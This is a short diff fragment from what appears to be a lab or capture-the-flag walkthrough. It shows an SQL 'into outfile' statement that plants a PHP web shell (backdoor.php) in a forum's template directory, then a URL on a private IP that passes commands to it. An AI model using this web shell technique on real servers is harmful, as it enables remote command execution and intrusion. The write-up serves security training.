@@ -103,3 +103,5 @@ but if we remember about the forum, we can search about some vulnerabilities and
 so we can use:
 SELECT "<? system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
 
+Now if we use "https://192.168.1.96/forum/templates_c/backdoor.php?cmd=" we have a reverse shell!!
+
